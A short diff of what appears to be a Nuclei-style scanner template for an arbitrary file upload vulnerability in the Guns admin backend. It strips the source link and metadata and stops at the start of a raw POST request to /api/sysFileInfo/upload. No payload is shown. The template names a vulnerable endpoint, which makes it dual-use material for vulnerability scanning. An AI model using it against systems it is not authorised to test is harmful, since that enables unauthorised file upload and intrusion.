@@ -3,11 +3,8 @@ info:
   name: Guns后台upload 任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vmcycw2yk6abvo0u'
+  description: ''
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: vmcycw2yk6abvo0u
 http:
 - raw:
   - 'POST /api/sysFileInfo/upload HTTP/1.1
